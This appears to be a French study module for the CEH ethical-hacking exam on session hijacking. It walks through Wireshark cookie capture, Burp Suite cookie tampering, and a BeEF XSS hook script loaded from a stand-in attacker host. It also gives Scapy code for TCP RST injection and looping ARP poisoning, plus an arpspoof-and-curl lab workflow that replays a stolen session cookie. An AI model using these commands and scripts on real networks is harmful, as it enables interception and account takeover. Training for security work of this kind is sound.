# 🔴 Module 11 — Outils & Labs : Session Hijacking

> **CEH v13 | EC-Council**  
> `#Wireshark` `#BurpSuite` `#BeEF` `#Scapy` `#Hamster`

---

## 📌 Table des matières

1. [Wireshark — Capture de sessions](#1-wireshark)
2. [Burp Suite — Interception de cookies](#2-burp-suite)
3. [BeEF — Browser Exploitation Framework](#3-beef)
4. [Scapy — Injection TCP](#4-scapy)
5. [Hamster & Ferret — Sidejacking](#5-hamster--ferret)
6. [Workflow d'attaque complet](#6-workflow-complet)

---

## 1. Wireshark — Capture de sessions

Wireshark permet de capturer et analyser les paquets réseau pour extraire des cookies de session.

```bash
# Lancer Wireshark en CLI (tshark) :
tshark -i eth0 -Y "http.cookie" -T fields -e http.cookie

# Filtres Wireshark utiles :
http.cookie                    # Affiche tous les cookies HTTP
http.set_cookie                # Cookies définis par le serveur
http contains "session"        # Paquets contenant "session"
tcp.stream eq 5                # Suivre un flux TCP spécifique

# Filtre pour isoler trafic d'une IP :
ip.addr == 192.168.1.10 && http
```

### Extraction automatique des cookies

```bash
# Avec tshark, extraire tous les Set-Cookie :
tshark -r capture.pcap -Y "http.set_cookie" \
  -T fields -e ip.src -e http.set_cookie

# Résultat :
192.168.1.1   sessionid=a3f2c9d1e5; Path=/; HttpOnly
192.168.1.1   csrftoken=xyz789; SameSite=Lax
```

> ⚠️ **Rappel CEH** : Wireshark est un **analyseur de protocole réseau** (sniffer passif), il ne modifie pas le trafic. Pour la modification, utiliser Burp Suite.

---

## 2. Burp Suite — Interception et Modification de Cookies

Burp Suite est l'outil central du CEH pour les tests d'application web.

### Configuration du proxy

```
1. Burp : Proxy → Options → Listening on 127.0.0.1:8080
2. Navigateur : Proxy HTTP = 127.0.0.1:8080
3. Importer le certificat Burp CA dans le navigateur (pour HTTPS)
```

### Manipulation de cookie en session

```
Intercept → Modifier la requête :

AVANT :
GET /dashboard HTTP/1.1
Host: vulnerable.com
Cookie: sessionid=USER_SESSION_ID; role=user

APRÈS (modifié) :
GET /dashboard HTTP/1.1
Host: vulnerable.com
Cookie: sessionid=STOLEN_SESSION_ID; role=admin
```

### Repeater — Rejouer des requêtes

```
1. Capturer une requête avec un cookie valide
2. Envoyer au Repeater (Ctrl+R)
3. Modifier le cookie (ex: rôle, ID utilisateur)
4. Envoyer et observer la réponse
→ Détection de contrôle d'accès insuffisant
```

### Intruder — Brute Force de Session ID

```
Configurer le champ session à fuzzer :
GET /dashboard HTTP/1.1
Cookie: sessionid=§AAAA§

Attack Type : Brute Forcer
→ Tenter de deviner les sessions actives
→ Applicable si l'entropie du Session ID est faible
```

---

## 3. BeEF — Browser Exploitation Framework

BeEF permet d'exploiter des navigateurs via XSS pour effectuer du session hijacking et d'autres attaques.

```
Architecture BeEF :
                    
  [Attaquant]                          [Victime]
  BeEF Control Panel ◀── WebSocket ── [Browser hooked]
  http://attacker:3000/ui/panel        via XSS payload

XSS Payload pour hooker un navigateur :
<script src="http://attacker.com:3000/hook.js"></script>
```

### Commandes BeEF utiles

```
Dans BeEF Panel → Rider → Forge Request :
  → Envoyer des requêtes avec les cookies de la victime
  → Effectuer des actions en son nom

Module : Cookie Harvester :
  → Capture automatiquement document.cookie
  → Résultat : sessionid=abc123; auth=xyz789

Module : Redirect Browser :
  → Rediriger vers un site de phishing
```

---

## 4. Scapy — Injection et Manipulation TCP

Scapy permet de forger des paquets réseau pour des attaques TCP avancées.

```python
# Exemple : RST injection pour couper une connexion
from scapy.all import *

# Paramètres de la session TCP cible
target_ip = "192.168.1.20"
target_port = 80
spoofed_src = "192.168.1.10"  # IP de la victime

# Forger un paquet RST avec le bon SEQ
pkt = IP(src=spoofed_src, dst=target_ip) / \
      TCP(sport=12345, dport=target_port, flags="R", seq=1234567)

send(pkt, verbose=0)
print("RST injecté — connexion coupée")
```

```python
# Exemple : ARP Spoofing avec Scapy
from scapy.all import *
import time

def arp_poison(target_ip, spoof_ip):
    # Récupérer MAC de la cible
    target_mac = getmacbyip(target_ip)
    pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(pkt, verbose=False)

while True:
    arp_poison("192.168.1.10", "192.168.1.1")   # Empoisonner Alice
    arp_poison("192.168.1.1", "192.168.1.10")   # Empoisonner le routeur
    time.sleep(2)
```

---

## 5. Hamster & Ferret — Sidejacking

Outils historiques (2007) dédiés à la capture et réutilisation de cookies HTTP en clair.

```
Workflow Hamster/Ferret sur réseau Wi-Fi ouvert :

1. Mettre l'interface en mode monitor :
   airmon-ng start wlan0

2. Lancer Ferret (capture les cookies) :
   ferret -i wlan0mon

3. Lancer Hamster (proxy de rejeu) :
   hamster
   → Interface web : http://127.0.0.1:1234

4. Configurer le navigateur → proxy 127.0.0.1:1234
5. Dans Hamster : sélectionner la session capturée
6. Naviguer → Le proxy injecte automatiquement les cookies volés
```

> ⚠️ **Rappel CEH** : Hamster/Ferret sont **obsolètes** car HTTPS est quasi-universel. Leur concept reste important pour comprendre les risques du Wi-Fi non sécurisé.

---

## 6. Workflow d'Attaque Complet (Scénario de Lab)

```
Objectif : Vol de session sur réseau local
Environnement : Kali Linux, victime sur même réseau

Étape 1 : Reconnaissance
  nmap -sV 192.168.1.0/24
  → Identifier la cible (192.168.1.50 : serveur web sur :8080)

Étape 2 : Positionnement MITM
  arpspoof -i eth0 -t 192.168.1.50 192.168.1.1
  arpspoof -i eth0 -t 192.168.1.1 192.168.1.50
  sysctl net.ipv4.ip_forward=1  ← Activer le forwarding

Étape 3 : Capture du trafic
  wireshark -i eth0 -Y "http.cookie" &
  
Étape 4 : Extraction du cookie de session
  tshark -r capture.pcap -Y "http.cookie" -T fields -e http.cookie
  → sessionid=a3f2c9d1e5f8b2a7

Étape 5 : Réutilisation du cookie
  curl -H "Cookie: sessionid=a3f2c9d1e5f8b2a7" http://192.168.1.50:8080/admin
  → Accès à l'espace admin de la victime
```

---

## 🧠 Points clés à retenir pour l'examen

- **Wireshark** = analyse passive (sniffing), ne modifie pas le trafic
- **Burp Suite** = interception/modification active des requêtes HTTP/HTTPS
- **BeEF** = exploitation navigateur via XSS, module hook.js
- **Scapy** = forgeage de paquets réseau (TCP RST, ARP spoofing)
- Le sidejacking nécessite un réseau partagé et des cookies non sécurisés (sans flag `Secure`)

---

*⬅️ [Techniques avancées](./03_techniques_avancees.md) | ➡️ [Contre-mesures](./05_contre-mesures.md)*
